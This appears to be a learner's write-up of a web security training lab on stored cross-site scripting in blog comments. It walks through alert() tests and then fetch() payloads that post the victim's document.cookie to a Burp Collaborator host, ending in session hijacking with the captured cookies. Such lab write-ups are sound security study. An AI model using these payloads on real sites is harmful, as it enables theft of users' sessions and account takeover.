# Lab: Exploiting cross-site scripting to steal cookies

>This lab contains a stored XSS vulnerability in the blog comments function. A simulated victim user views all comments after they are posted. To solve the lab, exploit the vulnerability to exfiltrate the victim's session cookie, then use this cookie to impersonate the victim. 

### First steps
My Burp Collaborator link: `if1w9ekwz1oini15l78c7vnvvm1cp1.burpcollaborator.net`

First I will use the alert() method to confirm that there is an XSS vulnerability. I created a new comment with the following payload in the comments section `<img src=x onerror=alert()>`. This triggered an alert, so we can confirm that this is vulnerable to stored dom XSS.

### Getting the cookie
To confirm that I can get the cookie, I added `document.cookie` into my payload like so: `<img src=x onerror=alert(document.cookie)>&name=<img src=x onerror=alert()>`

This worked, so now all we need to do is send the value of document.cookie to our burp collaborator instance

### Making a request to collaborator
Now I want to confirm that I can make a request to my collaborator instance through this exploit. I modified my payload like so and saw some data in my burp collaborator client: `<img src=x onerror=fetch("https://if1w9ekwz1oini15l78c7vnvvm1cp1.burpcollaborator.net")>`. I tried adding document.cookie as a subdomain of the request but that did not work

### Pivoting
Turns out that I can just directly create a script tag for this challenge, so this payload as a comment yields a DNS request `<script>fetch("https://if1w9ekwz1oini15l78c7vnvvm1cp1.burpcollaborator.net")</script>`. Since I wasn't able to make a GET request with the value of documnent.cookie as a subdomain, I decided to try a POST request. I had this idea because POST requests can send body content. My modified payload is as follows:

 `<script>fetch("https://if1w9ekwz1oini15l78c7vnvvm1cp1.burpcollaborator.net",{method: "POST", mode: "no-cors", body: document.cookie})</script>`

Looking at burp collaborator, we can see the body of the post request contains `secret=ywuqlwpW8rVDWGnRvJqhp2XNQvVlFJDb; session=me4wpMEILTsmZB0Lq9Arlv9QvndOkMq4`

### Solution
Completion of this lab is dependent on hijacking the user's session. To do this I just re-loaded the main page of the application and inserted the exfiltrated `secret` and `session` information. I am now logged in as this user, lab solved!